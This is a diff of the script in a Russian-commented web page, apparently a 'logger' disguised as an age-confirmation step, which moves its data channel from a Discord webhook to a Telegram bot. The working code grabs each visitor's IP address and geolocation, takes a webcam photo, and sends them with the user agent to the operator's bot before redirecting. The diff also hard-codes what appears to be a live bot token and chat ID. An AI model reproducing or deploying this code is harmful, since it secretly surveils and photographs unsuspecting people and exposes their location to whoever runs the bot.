@@ -55,10 +55,11 @@
     </div>
 
     <script>
-        // !!! СЮДА ВСТАВЬ СВОЙ DISCORD WEBHOOK URL !!!
-        const WEBHOOK_URL = "ВАШ_ВЕБХУК";
+        // !!! СЮДА ВСТАВЬ СВОИ ДАННЫЕ ОТ TELEGRAM !!!
+        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";   // Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+        const TELEGRAM_CHAT_ID = "805226689";    // Например: "123456789"
 
-        // ---------- ФУНКЦИИ СБОРА ДАННЫХ ----------
+        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ IP ----------
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -67,6 +68,7 @@
             } catch(e) { return 'не удалось определить'; }
         }
 
+        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ----------
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -80,6 +82,7 @@
             });
         }
 
+        // ---------- ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ----------
         async function takePhoto() {
             return new Promise((resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -106,34 +109,34 @@
             });
         }
 
-        // ---------- ОТПРАВКА В DISCORD ----------
-        async function sendToDiscord(ip, location, photo) {
+        // ---------- ОТПРАВКА В TELEGRAM ----------
+        async function sendToTelegram(ip, location, photo) {
             const ua = navigator.userAgent;
-            const embed = {
-                title: '📸 НОВЫЙ ПЕРЕХОД',
-                color: 0x5865F2,
-                fields: [
-                    { name: '🌐 IP-адрес', value: ip, inline: true },
-                    { name: '📍 Геолокация', value: location, inline: true },
-                    { name: '💻 User-Agent', value: ua.length > 80 ? ua.slice(0,80)+'…' : ua, inline: false },
-                    { name: '🕒 Время', value: new Date().toLocaleString('ru-RU'), inline: true }
-                ],
-                footer: { text: 'XLogger • Возраст подтверждён' }
-            };
-
-            const payload = { embeds: [embed] };
+            const caption = `📸 НОВЫЙ ПЕРЕХОД
+🌐 IP: ${ip}
+📍 Гео: ${location}
+💻 User-Agent: ${ua}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
 
             if (photo && photo.startsWith('data:image')) {
                 const blob = await (await fetch(photo)).blob();
-                const form = new FormData();
-                form.append('payload_json', JSON.stringify(payload));
-                form.append('file', blob, 'selfie.jpg');
-                await fetch(WEBHOOK_URL, { method: 'POST', body: form });
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('caption', caption);
+                formData.append('photo', blob, 'selfie.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
             } else {
-                await fetch(WEBHOOK_URL, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: caption
+                    })
                 });
             }
         }
@@ -148,7 +151,7 @@
             const location = await getLocation();
             const photo = await takePhoto();
 
-            await sendToDiscord(ip, location, photo);
+            await sendToTelegram(ip, location, photo);
 
             // Редирект после отправки
             setTimeout(() => {
